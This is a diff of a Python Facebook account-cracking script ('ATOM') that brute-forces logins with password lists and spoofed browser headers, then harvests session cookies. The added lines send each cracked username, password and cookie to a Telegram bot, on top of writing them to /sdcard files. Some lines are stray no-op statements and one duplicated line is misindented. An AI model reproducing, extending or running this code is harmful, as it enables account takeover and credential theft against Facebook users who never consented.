@@ -1185,9 +1185,13 @@ def m5(idf,pwv):
     reqx = requests.get(url).text
     if 'live' in reqx:
             print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
-            print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
+            print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki} \33[1;36m")
             open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
+            statusok = (f" {user} | {ps} | {coki} ")
+            requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
             ok+=1 
+            f'''datr={''.join(random.choices(string.ascii_letters + string.digits + '_', k = 24))};'''
+            'True'
             break
     if 'lock' in reqx:
             print(f'\r\r{p}[ATOM-OK]: {user} | {ps}')
@@ -1200,7 +1204,7 @@ def m5(idf,pwv):
     coki1 = coki.split("1000")[1]
     uid = "1000"+coki1[0:11]
     if 'y' in cp_xdx:
-     print(f'\r{P} [\033[1;30mATOM-CP.txt{P}] \033[1;30m{uid}|{ps}{xxx}')
+     print(f'\r{P} [\033[1;30mATOM-CP{P}] \033[1;30m{uid}|{ps}{xxx}')
     open(' /sdcard/ATOM-CP.txt','a').write(uid+'|'+ps+'|'+'\n')
     cp.append(uid)
    else:
@@ -1209,7 +1213,6 @@ def m5(idf,pwv):
   
  except:
   pass 
-
 
 def m6(idf,pw):
  global loop
@@ -1221,7 +1224,7 @@ def m6(idf,pw):
   for ps in pw:
    session = requests.Session()
    pro = random.choice(ugen)
-   free_fb = session.get('https://lm.facebook.com').text
+   free_fb = session.get('https://apps.facebook.com').text
    log_data = {
              "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -1249,7 +1252,8 @@ def m6(idf,pw):
             'sec-fetch-site': 'same-origin',
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
-   lo = session.post('https://business.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028&',data=log_data,headers=header_freefb).text
+   lo = session.post('https://m.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
+  log_cookies=session.cookies.get_dict().keys()
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -1263,13 +1267,21 @@ def m6(idf,pw):
             statusok = (f" {user} | {ps} | {coki} ")
             requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
             ok+=1 
+            f'''datr={''.join(random.choices(string.ascii_letters + string.digits + '_', k = 24))};'''
+            'True'
             break
-   elif 'c_user' in lo.cookies:
+    if 'lock' in reqx:
+            print(f'\r\r{p}[ATOM-OK]: {user} | {ps}')
+            print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
+            open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
+            ok+=1 
+            break
+   elif 'checkpoint' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
     coki1 = coki.split("1000")[1]
     uid = "1000"+coki1[0:11]
-    print(f'\r{P} [\033[1;30mATOM-CP{P}] \033[1;30m{uid}|{ps}{xxx}')
-    print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki} \33[1;36m")
+    if 'y' in cp_xdx:
+     print(f'\r{P} [\033[1;30mATOM-CP{P}] \033[1;30m{uid}|{ps}{xxx}')
     open(' /sdcard/ATOM-CP.txt','a').write(uid+'|'+ps+'|'+'\n')
     cp.append(uid)
    else:
@@ -1278,7 +1290,6 @@ def m6(idf,pw):
   
  except:
   pass 
-
 # INDIA X PAKISTAN -- MAIN DEF #
 
 if __name__=='__main__':
